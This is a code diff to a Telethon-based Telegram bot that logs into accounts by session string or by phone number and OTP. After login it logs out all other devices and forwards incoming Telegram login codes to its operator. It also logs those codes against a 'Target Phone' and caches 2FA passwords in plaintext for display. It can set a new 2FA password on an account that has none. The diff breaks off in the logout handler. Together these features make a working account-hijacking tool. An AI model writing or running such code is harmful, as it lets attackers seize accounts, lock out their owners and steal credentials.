@@ -4,9 +4,16 @@ from datetime import datetime, timezone, timedelta
 from aiohttp import web
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
-from telethon.tl.functions.account import GetPasswordRequest
+from telethon.tl.functions.account import GetPasswordRequest, UpdatePasswordRequest
 from telethon.tl.functions.auth import ResetAuthorizationsRequest
-from telethon.errors import FloodWaitError, RPCError
+from telethon.errors import (
+    FloodWaitError,
+    RPCError,
+    SessionPasswordNeededError,
+    PhoneCodeInvalidError,
+    PhoneCodeExpiredError,
+    PasswordHashInvalidError,
+)
 from config import (
     API_ID,
     API_HASH,
@@ -25,6 +32,9 @@ asyncio.set_event_loop(loop)
 
 bot = TelegramClient("autoview_otp_bot", API_ID, API_HASH, loop=loop)
 active_clients = {}
+pending_logins = {}
+pending_2fa_set = {}
+cached_2fa_passwords = {}
 sudo_users = set()
 IST = timezone(timedelta(hours=5, minutes=30))
 
@@ -63,6 +73,28 @@ def extract_otp(text: str):
     return match.group(1) if match else None
 
 
+def looks_like_phone(value: str) -> bool:
+    cleaned = re.sub(r"[\s\-\(\)]", "", value.strip())
+    return bool(re.fullmatch(r"\+?\d{7,15}", cleaned))
+
+
+async def cleanup_user_session(user_id: int):
+    client = active_clients.pop(user_id, None)
+    if client:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+    pending_state = pending_logins.pop(user_id, None)
+    if pending_state and pending_state.get("client"):
+        try:
+            await pending_state["client"].disconnect()
+        except Exception:
+            pass
+    pending_2fa_set.pop(user_id, None)
+    cached_2fa_passwords.pop(user_id, None)
+
+
 async def terminate_other_sessions(client: TelegramClient) -> str:
     """Baaki sabhi logged-in devices/sessions ko logout karta hai."""
     try:
@@ -76,6 +108,87 @@ async def terminate_other_sessions(client: TelegramClient) -> str:
         return f"Skipped ({rpc_err.message})"
     except Exception as exc:
         return f"Skipped ({str(exc)})"
+
+
+async def attach_otp_listener_and_finalize(
+    user_id: int,
+    uname: str,
+    user_client: TelegramClient,
+    status_or_event,
+    is_edit: bool = False,
+):
+    me = await user_client.get_me()
+    active_clients[user_id] = user_client
+
+    reset_status = await terminate_other_sessions(user_client)
+
+    try:
+        pwd_info = await user_client(GetPasswordRequest())
+        has_2fa = (
+            "Enabled (Telegram does not allow fetching existing password)"
+            if pwd_info.has_password
+            else "Disabled"
+        )
+        hint = pwd_info.hint if pwd_info.hint else "None"
+    except Exception:
+        has_2fa = "Unknown"
+        hint = "None"
+
+    @user_client.on(events.NewMessage(from_users=777000))
+    async def otp_listener(otp_event):
+        raw_msg = otp_event.raw_text or ""
+        code = extract_otp(raw_msg)
+        if code:
+            await bot.send_message(
+                user_id,
+                f"📩 **ɴᴀʏᴀ ᴛᴇʟᴇɢʀᴀᴍ ᴏᴛᴘ ᴀᴀʏᴀ ʜᴀɪ!**\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🔑 **ʟᴏɢɪɴ ᴄᴏᴅᴇ:** `{code}`\n"
+                f"📱 **ᴀᴄᴄᴏᴜɴᴛ:** `+{me.phone}`\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"📝 **ᴍᴇꜱꜱᴀɢᴇ:**\n{raw_msg}",
+            )
+            await send_log(
+                f"🔑 **#OTP_DELIVERED**\n"
+                f"• **User:** `{user_id}` ({uname})\n"
+                f"• **Target Phone:** `+{me.phone}`\n"
+                f"• **OTP Code:** `{code}`\n"
+                f"• **Time:** `{now_ist()}`"
+            )
+        else:
+            await bot.send_message(
+                user_id,
+                f"📩 **ᴛᴇʟᴇɢʀᴀᴍ (777000) ᴍᴇꜱꜱᴀɢᴇ:**\n\n{raw_msg}",
+            )
+
+    success_text = (
+        f"🎉 **ʟᴏɢɪɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ!**\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 **ᴀᴄᴄᴏᴜɴᴛ:** {me.first_name or 'User'}\n"
+        f"📱 **ᴘʜᴏɴᴇ:** `+{me.phone}`\n"
+        f"🆔 **ᴜꜱᴇʀ ɪᴅ:** `{me.id}`\n"
+        f"📱 **ᴅᴇᴠɪᴄᴇꜱ:** `{reset_status}`\n"
+        f"🔐 **2ꜰᴀ:** `{has_2fa}` (Hint: `{hint}`)\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"⏳ **3 ꜱᴇᴄ ᴡᴀɪᴛ ᴋʀᴏ, ʟᴀᴛᴇꜱᴛ ᴏᴛᴘ ᴄʜᴇᴄᴋ ᴋᴀʀ ʀᴀʜᴀ ʜᴏᴏɴ...**"
+    )
+
+    if is_edit:
+        await status_or_event.edit(success_text)
+    else:
+        await status_or_event.reply(success_text)
+
+    await asyncio.sleep(3)
+    await send_latest_otp(user_client, user_id, str(me.phone))
+
+    await send_log(
+        f"✅ **#LOGIN_SUCCESS**\n"
+        f"• **User:** `{user_id}` ({uname})\n"
+        f"• **Logged Account:** `{me.first_name}` (`+{me.phone}`, ID: `{me.id}`)\n"
+        f"• **Other Sessions:** `{reset_status}`\n"
+        f"• **2FA:** `{has_2fa}`\n"
+        f"• **Time:** `{now_ist()}`"
+    )
 
 
 def main_menu_buttons():
@@ -106,8 +219,8 @@ def back_to_start_buttons():
 START_CAPTION = (
     "✦ **ᴀᴜᴛᴏᴠɪᴇᴡ ꜱᴇꜱꜱɪᴏɴ ʟᴏɢɪɴ ʙᴏᴛ** ✦\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
-    "ᴀᴘɴɪ ᴛᴇʟᴇᴛʜᴏɴ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ꜱᴇ ᴀᴄᴄᴏᴜɴᴛ\n"
-    "ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ ᴀᴜʀ ʀᴇᴀʟ-ᴛɪᴍᴇ ᴏᴛᴘ ᴘʀᴀᴘᴛ ᴋᴀʀᴇɪɴ.\n\n"
+    "ᴀᴘɴɪ ᴛᴇʟᴇᴛʜᴏɴ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ʏᴀ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ꜱᴇ\n"
+    "ᴀᴄᴄᴏᴜɴᴛ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ ᴀᴜʀ ʀᴇᴀʟ-ᴛɪᴍᴇ ᴏᴛᴘ ᴘʀᴀᴘᴛ ᴋᴀʀᴇɪɴ.\n\n"
     "▸ **ꜱᴛᴀᴛᴜꜱ:** `ᴏɴʟɪɴᴇ & ʀᴇᴀᴅʏ`\n"
     "▸ **ᴏᴡɴᴇʀ:** @CoderNova\n"
     "▸ **ᴍᴏᴅᴇ:** `ᴅᴀᴛᴀʙᴀꜱᴇ-ꜰʀᴇᴇ / ꜰᴀꜱᴛ`\n"
@@ -119,9 +232,11 @@ HELP_TEXT = (
     "✦ **ᴀᴜᴛᴏᴠɪᴇᴡ — ʜᴇʟᴘ & ᴄᴏᴍᴍᴀɴᴅꜱ** ✦\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "• `/start` — ʙᴏᴛ ᴍᴇɴᴜ ᴀᴜʀ ꜱᴛᴀᴛᴜꜱ ᴅᴇᴋʜᴇɪɴ\n"
-    "• `/login <string>` — ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ, ᴏᴛʜᴇʀ ᴅᴇᴠɪᴄᴇꜱ ʟᴏɢᴏᴜᴛ + ᴏᴛᴘ\n"
+    "• `/login <string>` — ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ + ᴏᴛʜᴇʀ ᴅᴇᴠɪᴄᴇꜱ ʟᴏɢᴏᴜᴛ\n"
+    "• `/login +91xxxxxxxxxx` — ɴᴜᴍʙᴇʀ ꜱᴇ ᴏᴛᴘ ᴍᴀɴɢᴡᴀ ᴋᴀʀ ʟᴏɢɪɴ ᴋᴀʀᴇɪɴ\n"
     "• `/otp` ʏᴀ `/lastotp` — `777000` ꜱᴇ ʟᴀᴛᴇꜱᴛ ᴏᴛᴘ ʟᴇɪɴ\n"
     "• `/check` — 2ꜰᴀ ꜱᴛᴀᴛᴜꜱ, ʜɪɴᴛ ᴀᴜʀ ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ\n"
+    "• `/2fa` — 2ꜰᴀ ꜱᴛᴀᴛᴜꜱ / ᴄᴀᴄʜᴇᴅ ᴘᴀꜱꜱᴡᴏʀᴅ / ꜱᴇᴛ 2ꜰᴀ\n"
     "• `/logout` — ᴀᴄᴛɪᴠᴇ ꜱᴇꜱꜱɪᴏɴ ᴅɪꜱᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ\n"
     "• `/sudo <id>` — ᴜꜱᴇʀ ᴋᴏ ꜱᴜᴅᴏ ᴍᴇ ᴀᴅᴅ ᴋᴀʀᴇɪɴ (ᴏᴡɴᴇʀ)\n"
     "• `/unsudo <id>` — ᴜꜱᴇʀ ᴋᴏ ꜱᴜᴅᴏ ꜱᴇ ʜᴀᴛᴀʏᴇɪɴ (ᴏᴡɴᴇʀ)\n"
@@ -129,18 +244,17 @@ HELP_TEXT = (
     "• `/help` — ᴄᴏᴍᴍᴀɴᴅꜱ ʟɪꜱᴛ ᴅᴇᴋʜᴇɪɴ\n"
     "• `/guide` — ᴘᴜʀᴀ ꜱᴛᴇᴘ-ʙʏ-ꜱᴛᴇᴘ ɢᴜɪᴅᴇ ᴘᴀᴅʜᴇɪɴ\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
-    "💡 *ɴᴏᴛᴇ:* 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ᴛᴇʟᴇɢʀᴀᴍ ꜱᴇ ꜰᴇᴛᴄʜ ɴᴀʜɪ ʜᴏᴛᴀ."
+    "💡 *ɴᴏᴛᴇ:* ᴛᴇʟᴇɢʀᴀᴍ ᴋɪꜱɪ ʙʜɪ ᴘᴜʀᴀɴᴇ 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ᴋᴏ ꜰᴇᴛᴄʜ ɴᴀʜɪ ᴋᴀʀɴᴇ ᴅᴇᴛᴀ."
 )
 
 GUIDE_TEXT = (
     "◈ **ꜱᴛᴇᴘ-ʙʏ-ꜱᴛᴇᴘ ʟᴏɢɪɴ & ᴏᴛᴘ ɢᴜɪᴅᴇ** ◈\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
-    "**1.** `/login <your_telethon_string>` ʙʜᴇᴊᴇɪɴ.\n"
-    "**2.** ʙᴏᴛ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴋᴇ ʙᴀᴀᴋɪ ᴅᴇᴠɪᴄᴇꜱ ꜱᴇ ʟᴏɢᴏᴜᴛ ᴋᴀʀᴇɢᴀ ᴀᴜʀ ꜱᴜᴄᴄᴇꜱꜱ ᴍꜱɢ ᴅᴇɢᴀ.\n"
-    "**3.** 3 ꜱᴇᴄ ᴡᴀɪᴛ ᴋᴀʀᴋᴇ `777000` ꜱᴇ ʟᴀᴛᴇꜱᴛ ᴏᴛᴘ ʙʜᴇᴊᴇɢᴀ ᴀᴜʀ ɴᴀʏᴀ ᴏᴛᴘ ᴀᴀᴛᴇ ʜɪ ꜰᴏʀᴡᴀʀᴅ ᴋᴀʀᴇɢᴀ.\n"
+    "**1.** `/login <string>` ʏᴀ `/login +91xxxxxxxxxx` ʙʜᴇᴊᴇɪɴ.\n"
+    "**2.** ɴᴜᴍʙᴇʀ ʜᴏ ᴛᴏ ᴀᴀʏᴀ ᴏᴛᴘ (ᴀᴜʀ 2ꜰᴀ ʜᴏ ᴛᴏ ᴘᴀꜱꜱᴡᴏʀᴅ) ʙᴏᴛ ᴋᴏ ʙʜᴇᴊᴇɪɴ.\n"
+    "**3.** ʙᴏᴛ ʙᴀᴀᴋɪ ᴅᴇᴠɪᴄᴇꜱ ꜱᴇ ʟᴏɢᴏᴜᴛ ᴋᴀʀᴋᴇ 3 ꜱᴇᴄ ʙᴀᴀᴅ `777000` ꜱᴇ ᴏᴛᴘ ʙʜᴇᴊᴇɢᴀ.\n"
     "**4.** ᴘʜɪʀ ꜱᴇ ᴏᴛᴘ ᴄʜᴀʜɪʏᴇ ᴛᴏ `/otp` ʏᴀ `/lastotp` ᴅᴀʙᴀʏᴇɪɴ.\n"
-    "**5.** 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ᴛᴇʟᴇɢʀᴀᴍ ᴍᴇ ꜰᴇᴛᴄʜ ɴᴀʜɪ ʜᴏᴛᴀ; `/check` ꜱᴇ\n"
-    "    ꜱɪʀꜰ 2ꜰᴀ ꜱᴛᴀᴛᴜꜱ ᴀᴜʀ ʜɪɴᴛ ᴅᴇᴋʜ ꜱᴀᴋᴛᴇ ʜᴀɪɴ.\n"
+    "**5.** `/2fa` ꜱᴇ 2ꜰᴀ ꜱᴛᴀᴛᴜꜱ ᴅᴇᴋʜᴇɪɴ (ᴇxɪꜱᴛɪɴɢ ᴘᴀꜱꜱᴡᴏʀᴅ ᴛᴇʟᴇɢʀᴀᴍ ꜰᴇᴛᴄʜ ɴᴀʜɪ ᴋᴀʀɴᴇ ᴅᴇᴛᴀ).\n"
     "**6.** ᴋᴀᴀᴍ ʜᴏɴᴇ ᴋᴇ ʙᴀᴀᴅ `/logout` ᴋᴀʀᴇɪɴ.\n"
     "━━━━━━━━━━━━━━━━━━━━━━"
 )
@@ -251,12 +365,7 @@ async def remove_sudo_handler(event):
         return await event.reply(f"ℹ️ **User `{target_id}` ꜱᴜᴅᴏ ʟɪꜱᴛ ᴍᴇ ɴᴀʜɪ ʜᴀɪ.**")
 
     sudo_users.remove(target_id)
-    if target_id in active_clients:
-        try:
-            await active_clients[target_id].disconnect()
-        except Exception:
-            pass
-        del active_clients[target_id]
+    await cleanup_user_session(target_id)
 
     await event.reply(f"🗑️ **User `{target_id}` ᴋᴏ ꜱᴜᴅᴏ ꜱᴇ ʜᴀᴛᴀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ.**")
     await send_log(
@@ -356,28 +465,75 @@ async def login_handler(event):
     user_id = event.sender_id
     sender = await event.get_sender()
     uname = f"@{sender.username}" if sender and sender.username else "No Username"
-    session_str = event.pattern_match.group(1)
+    raw_arg = event.pattern_match.group(1)
 
-    if not session_str:
+    if not raw_arg:
         return await event.reply(
-            "❌ **ᴜꜱᴀɢᴇ:** `/login <aapki_telethon_string>`\n\n"
+            "❌ **ᴜꜱᴀɢᴇ:**\n"
+            "• `/login <aapki_telethon_string>`\n"
+            "• `/login +919876543210`\n\n"
             "ᴘᴜʀɪ ᴊᴀɴᴋᴀʀɪ ᴋᴇ ʟɪʏᴇ `/guide` ᴄʜᴇᴄᴋ ᴋᴀʀᴇɪɴ."
         )
 
-    session_str = session_str.strip()
+    arg_val = raw_arg.strip()
+    await cleanup_user_session(user_id)
+
+    # Case 1: Mobile Number Login Flow
+    if looks_like_phone(arg_val):
+        phone = re.sub(r"[\s\-\(\)]", "", arg_val)
+        if not phone.startswith("+"):
+            phone = f"+{phone}"
+
+        status_msg = await event.reply(
+            f"📲 **ɴᴜᴍʙᴇʀ `{phone}` ᴘᴀʀ ᴏᴛᴘ ʙʜᴇᴊ ʀᴀʜᴀ ʜᴏᴏɴ...**"
+        )
+        try:
+            user_client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
+            await user_client.connect()
+            sent = await user_client.send_code_request(phone)
+
+            pending_logins[user_id] = {
+                "step": "awaiting_otp",
+                "phone": phone,
+                "phone_code_hash": sent.phone_code_hash,
+                "client": user_client,
+                "uname": uname,
+            }
+
+            await status_msg.edit(
+                f"📩 **ᴏᴛᴘ ʙʜᴇᴊ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ (`{phone}`)**\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"ᴀᴘɴᴇ ᴛᴇʟᴇɢʀᴀᴍ / ꜱᴍꜱ ᴍᴇ ᴀᴀʏᴀ **5-digit OTP** ʏᴀʜᴀɴ ʙʜᴇᴊᴇɪɴ.\n"
+                f"*(Cancel karne ke liye `/logout` likhein)*"
+            )
+            await send_log(
+                f"📲 **#PHONE_OTP_SENT**\n"
+                f"• **User:** `{user_id}` ({uname})\n"
+                f"• **Phone:** `{phone}`\n"
+                f"• **Time:** `{now_ist()}`"
+            )
+        except Exception as exc:
+            try:
+                await user_client.disconnect()
+            except Exception:
+                pass
+            await status_msg.edit(f"❌ **ᴏᴛᴘ ꜱᴇɴᴅ ꜰᴀɪʟᴇᴅ:** `{str(exc)}`")
+            await send_log(
+                f"🚨 **#PHONE_OTP_ERROR**\n"
+                f"• **User:** `{user_id}` ({uname})\n"
+                f"• **Phone:** `{phone}`\n"
+                f"• **Error:** `{str(exc)}`\n"
+                f"• **Time:** `{now_ist()}`"
+            )
+        return
+
+    # Case 2: StringSession Login Flow
     status_msg = await event.reply(
         "⏳ **ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀ ʀᴀʜᴀ ʜᴏᴏɴ ᴀᴜʀ ᴏʟᴅ ᴅᴇᴠɪᴄᴇꜱ ʟᴏɢᴏᴜᴛ ᴋᴀʀɴᴇ ᴋɪ ᴋᴏꜱʜɪꜱʜ ᴊᴀʀɪ ʜᴀɪ...**"
     )
 
-    if user_id in active_clients:
-        try:
-            await active_clients[user_id].disconnect()
-        except Exception:
-            pass
-        del active_clients[user_id]
-
     try:
-        user_client = TelegramClient(StringSession(session_str), API_ID, API_HASH, loop=loop)
+        user_client = TelegramClient(StringSession(arg_val), API_ID, API_HASH, loop=loop)
         await user_client.connect()
 
         if not await user_client.is_user_authorized():
@@ -391,71 +547,12 @@ async def login_handler(event):
             )
             return
 
-        me = await user_client.get_me()
-        active_clients[user_id] = user_client
-
-        # Baaki sabhi purane sessions/devices se logout karein
-        reset_status = await terminate_other_sessions(user_client)
-
-        # 2FA status check (password fetch nahi ho sakta)
-        try:
-            pwd_info = await user_client(GetPasswordRequest())
-            has_2fa = "Enabled (Password hidden by Telegram)" if pwd_info.has_password else "Disabled"
-            hint = pwd_info.hint if pwd_info.hint else "None"
-        except Exception:
-            has_2fa = "Unknown"
-            hint = "None"
-
-        @user_client.on(events.NewMessage(from_users=777000))
-        async def otp_listener(otp_event):
-            raw_msg = otp_event.raw_text or ""
-            code = extract_otp(raw_msg)
-            if code:
-                await bot.send_message(
-                    user_id,
-                    f"📩 **ɴᴀʏᴀ ᴛᴇʟᴇɢʀᴀᴍ ᴏᴛᴘ ᴀᴀʏᴀ ʜᴀɪ!**\n"
-                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"🔑 **ʟᴏɢɪɴ ᴄᴏᴅᴇ:** `{code}`\n"
-                    f"📱 **ᴀᴄᴄᴏᴜɴᴛ:** `+{me.phone}`\n"
-                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"📝 **ᴍᴇꜱꜱᴀɢᴇ:**\n{raw_msg}",
-                )
-                await send_log(
-                    f"🔑 **#OTP_DELIVERED**\n"
-                    f"• **User:** `{user_id}` ({uname})\n"
-                    f"• **Target Phone:** `+{me.phone}`\n"
-                    f"• **OTP Code:** `{code}`\n"
-                    f"• **Time:** `{now_ist()}`"
-                )
-            else:
-                await bot.send_message(
-                    user_id,
-                    f"📩 **ᴛᴇʟᴇɢʀᴀᴍ (777000) ᴍᴇꜱꜱᴀɢᴇ:**\n\n{raw_msg}",
-                )
-
-        # Login Success Message turant bhejein
-        await status_msg.edit(
-            f"🎉 **ʟᴏɢɪɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ!**\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"👤 **ᴀᴄᴄᴏᴜɴᴛ:** {me.first_name or 'User'}\n"
-            f"📱 **ᴘʜᴏɴᴇ:** `+{me.phone}`\n"
-            f"🆔 **ᴜꜱᴇʀ ɪᴅ:** `{me.id}`\n"
-            f"📱 **ᴅᴇᴠɪᴄᴇꜱ:** `{reset_status}`\n"
-            f"🔐 **2ꜰᴀ:** `{has_2fa}` (Hint: `{hint}`)\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"⏳ **3 ꜱᴇᴄ ᴡᴀɪᴛ ᴋʀᴏ, ʟᴀᴛᴇꜱᴛ ᴏᴛᴘ ᴄʜᴇᴄᴋ ᴋᴀʀ ʀᴀʜᴀ ʜᴏᴏɴ...**"
-        )
-
-        await asyncio.sleep(3)
-        await send_latest_otp(user_client, user_id, str(me.phone))
-
-        await send_log(
-            f"✅ **#LOGIN_SUCCESS**\n"
-            f"• **User:** `{user_id}` ({uname})\n"
-            f"• **Logged Account:** `{me.first_name}` (`+{me.phone}`, ID: `{me.id}`)\n"
-            f"• **Other Sessions:** `{reset_status}`\n"
-            f"• **2FA:** `{has_2fa}`\n"
-            f"• **Time:** `{now_ist()}`"
+        await attach_otp_listener_and_finalize(
+            user_id=user_id,
+            uname=uname,
+            user_client=user_client,
+            status_or_event=status_msg,
+            is_edit=True,
         )
 
     except Exception as exc:
@@ -468,6 +565,85 @@ async def login_handler(event):
         )
 
 
+@bot.on(events.NewMessage(func=lambda e: e.is_private and not (e.raw_text or "").startswith("/")))
+async def interactive_login_step_handler(event):
+    user_id = event.sender_id
+    if not is_authorized(user_id):
+        return
+
+    text = (event.raw_text or "").strip()
+    if not text:
+        return
+
+    # Agar user /2fa se naya password set kar raha hai
+    if user_id in pending_2fa_set:
+        client = active_clients.get(user_id)
+        pending_2fa_set.pop(user_id, None)
+        if not client:
+            return await event.reply("❌ **ᴀᴄᴛɪᴠᴇ ꜱᴇꜱꜱɪᴏɴ ɴᴀʜɪ ᴍɪʟᴀ. ᴘᴇʜʟᴇ `/login` ᴋᴀʀᴇɪɴ.**")
+        try:
+            await client.edit_2fa(new_password=text)
+            cached_2fa_passwords[user_id] = text
+            return await event.reply("✅ **2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇᴛ ʜᴏ ɢᴀʏᴀ ʜᴀɪ.**")
+        except Exception as exc:
+            return await event.reply(f"❌ **2ꜰᴀ ꜱᴇᴛ ꜰᴀɪʟᴇᴅ:** `{str(exc)}`")
+
+    state = pending_logins.get(user_id)
+    if not state:
+        return
+
+    step = state.get("step")
+    phone = state.get("phone")
+    phone_code_hash = state.get("phone_code_hash")
+    user_client = state.get("client")
+    uname = state.get("uname", "No Username")
+
+    if step == "awaiting_otp":
+        code = re.sub(r"\D", "", text)
+        if not code:
+            return await event.reply("❌ **ᴋʀɪᴘʏᴀ ꜱᴀʜɪ ᴏᴛᴘ ɴᴜᴍʙᴇʀ ʙʜᴇᴊᴇɪɴ (jaise `12345`).**")
+
+        try:
+            await user_client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+            pending_logins.pop(user_id, None)
+            await attach_otp_listener_and_finalize(
+                user_id=user_id,
+                uname=uname,
+                user_client=user_client,
+                status_or_event=event,
+                is_edit=False,
+            )
+        except SessionPasswordNeededError:
+            state["step"] = "awaiting_password"
+            await event.reply(
+                "🔐 **ɪꜱ ᴀᴄᴄᴏᴜɴᴛ ᴘᴀʀ 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ʟᴀɢᴀ ʜᴀɪ.**\n"
+                "ᴀᴘɴᴀ 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ʙʜᴇᴊᴇɪɴ:"
+            )
+        except (PhoneCodeInvalidError, PhoneCodeExpiredError):
+            await event.reply("❌ **ᴏᴛᴘ ɢᴀʟᴀᴛ ʏᴀ ᴇxᴘɪʀᴇᴅ ʜᴀɪ. ᴅᴏʙᴀʀᴀ ꜱᴀʜɪ ᴏᴛᴘ ʙʜᴇᴊᴇɪɴ ʏᴀ `/login <number>` ꜱᴇ ɴᴀʏᴀ ᴏᴛᴘ ᴍᴀɴɢᴡᴀʏᴇɪɴ.**")
+        except Exception as exc:
+            await cleanup_user_session(user_id)
+            await event.reply(f"❌ **ʟᴏɢɪɴ ꜰᴀɪʟᴇᴅ:** `{str(exc)}`")
+
+    elif step == "awaiting_password":
+        try:
+            await user_client.sign_in(password=text)
+            cached_2fa_passwords[user_id] = text
+            pending_logins.pop(user_id, None)
+            await attach_otp_listener_and_finalize(
+                user_id=user_id,
+                uname=uname,
+                user_client=user_client,
+                status_or_event=event,
+                is_edit=False,
+            )
+        except PasswordHashInvalidError:
+            await event.reply("❌ **2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ɢᴀʟᴀᴛ ʜᴀɪ. ᴅᴏʙᴀʀᴀ ꜱᴀʜɪ ᴘᴀꜱꜱᴡᴏʀᴅ ʙʜᴇᴊᴇɪɴ:**")
+        except Exception as exc:
+            await cleanup_user_session(user_id)
+            await event.reply(f"❌ **2ꜰᴀ ʟᴏɢɪɴ ꜰᴀɪʟᴇᴅ:** `{str(exc)}`")
+
+
 @bot.on(events.NewMessage(pattern=r"^/(?:otp|lastotp)(?:@\w+)?$", func=lambda e: e.is_private))
 async def fetch_otp_handler(event):
     if not is_authorized(event.sender_id):
@@ -476,7 +652,7 @@ async def fetch_otp_handler(event):
     user_id = event.sender_id
     client = active_clients.get(user_id)
     if not client:
-        return await event.reply("❌ **ᴘᴇʜʟᴇ `/login <string>` ꜱᴇ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ.**")
+        return await event.reply("❌ **ᴘᴇʜʟᴇ `/login <string/number>` ꜱᴇ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ.**")
 
     try:
         me = await client.get_me()
@@ -495,12 +671,12 @@ async def check_account_handler(event):
     user_id = event.sender_id
     client = active_clients.get(user_id)
     if not client:
-        return await event.reply("❌ **ᴘᴇʜʟᴇ `/login <string>` ꜱᴇ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ.**")
+        return await event.reply("❌ **ᴘᴇʜʟᴇ `/login <string/number>` ꜱᴇ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ.**")
 
     try:
         me = await client.get_me()
         pwd_info = await client(GetPasswordRequest())
-        has_2fa = "Enabled (Password fetch not possible)" if pwd_info.has_password else "Disabled"
+        has_2fa = "Enabled (Existing password cannot be fetched)" if pwd_info.has_password else "Disabled"
         hint = pwd_info.hint if pwd_info.hint else "None"
 
         await event.reply(
@@ -517,6 +693,45 @@ async def check_account_handler(event):
         await event.reply(f"❌ **ᴄʜᴇᴄᴋ ᴇʀʀᴏʀ:** `{str(exc)}`")
 
 
+@bot.on(events.NewMessage(pattern=r"^/2fa(?:@\w+)?$", func=lambda e: e.is_private))
+async def two_fa_handler(event):
+    if not is_authorized(event.sender_id):
+        return await event.reply("⛔ **ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ:** ʏᴇʜ ʙᴏᴛ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴀᴜʀ ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ ᴋᴇ ʟɪʏᴇ ʜᴀɪ.")
+
+    user_id = event.sender_id
+    client = active_clients.get(user_id)
+    if not client:
+        return await event.reply("❌ **ᴘᴇʜʟᴇ `/login <string/number>` ꜱᴇ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ.**")
+
+    try:
+        pwd_info = await client(GetPasswordRequest())
+        hint = pwd_info.hint if pwd_info.hint else "None"
+
+        if pwd_info.has_password:
+            session_pwd = cached_2fa_passwords.get(user_id)
+            pwd_line = (
+                f"• **Current Session Password:** `{session_pwd}`\n"
+                if session_pwd
+                else "• **Present Password:** `Telegram does not allow fetching existing 2FA password`\n"
+            )
+            await event.reply(
+                f"🔐 **2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ɪɴꜰᴏ**\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"• **Status:** `Enabled`\n"
+                f"• **Hint:** `{hint}`\n"
+                f"{pwd_line}"
+                f"━━━━━━━━━━━━━━━━━━━━━━"
+            )
+        else:
+            pending_2fa_set[user_id] = True
+            await event.reply(
+                f"🔓 **ɪꜱ ᴀᴄᴄᴏᴜɴᴛ ᴘᴀʀ 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ꜱᴇᴛ ɴᴀʜɪ ʜᴀɪ (`Hint: {hint}`).**\n\n"
+                f"ᴀɢᴀʀ ᴀʙʜɪ ɴᴀʏᴀ 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ꜱᴇᴛ ᴋᴀʀɴᴀ ʜᴀɪ ᴛᴏ ᴡᴏʜ ᴘᴀꜱꜱᴡᴏʀᴅ ʏᴀʜᴀɴ ʙʜᴇᴊᴇɪɴ:"
+            )
+    except Exception as exc:
+        await event.reply(f"❌ **2ꜰᴀ ᴇʀʀᴏʀ:** `{str(exc)}`")
+
+
 @bot.on(events.NewMessage(pattern=r"^/logout(?:@\w+)?$", func=lambda e: e.is_private))
 async def logout_handler(event):
     if not is_authorized(event.sender_id):
@@ -526,12 +741,8 @@ async def logout_handler(event):
     sender = await event.get_sender()
     uname = f"@{sender.username}" if sender and sender.username else "No Username"
 
-    if user_id in active_clients:
-        try:
-            await active_clients[user_id].disconnect()
